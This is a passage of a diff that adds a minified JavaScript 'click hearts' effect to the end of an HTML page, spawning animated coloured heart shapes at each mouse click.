+          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
+          requestAnimationFrame(r)
+        }
+
+        function n() {
+          var t = "function" == typeof e.onclick && e.onclick;
+          e.onclick = function (e) {
+            t && t(), o(e)
+          }
+        }
+
+        function o(e) {
+          var a = t.createElement("div");
+          a.className = "heart", s.push({
+            el: a,
+            x: e.clientX - 5,
+            y: e.clientY - 5,
+            scale: 1,
+            alpha: 1,
+            color: c()
+          }), t.body.appendChild(a)
+        }
+
+        function i(e) {
+          var a = t.createElement("style");
+          a.type = "text/css";
+          try {
+            a.appendChild(t.createTextNode(e))
+          } catch (t) {
+            a.styleSheet.cssText = e
+          }
+          t.getElementsByTagName("head")[0].appendChild(a)
+        }
+
+        function c() {
+          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+        }
+
+        var s = [];
+        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
+          setTimeout(e, 1e3 / 60)
+        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
+      }(window, document);
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
